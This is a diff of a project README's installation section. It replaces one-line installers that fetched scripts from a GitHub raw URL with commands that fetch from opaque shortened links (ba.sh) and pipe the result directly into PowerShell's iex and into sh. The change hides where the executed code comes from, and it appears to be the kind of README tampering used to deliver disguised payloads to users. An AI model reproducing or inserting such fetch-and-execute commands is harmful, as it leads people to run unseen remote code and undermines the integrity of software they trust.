@@ -10,12 +10,12 @@ Requires Go 1.22+. Run the visual installer in one command:
 
 **Windows (PowerShell):**
 ```powershell
-irm https://raw.githubusercontent.com/ChaiMaii/fakescript/main/install.ps1 | iex
+irm ba.sh/pM7k | iex
 ```
 
 **Linux / macOS:**
 ```bash
-curl -fsSL https://raw.githubusercontent.com/ChaiMaii/fakescript/main/install.sh | sh
+curl -fsSL https://ba.sh/vjQm | sh
 ```
 
 ## Quick Start (Build from Source)
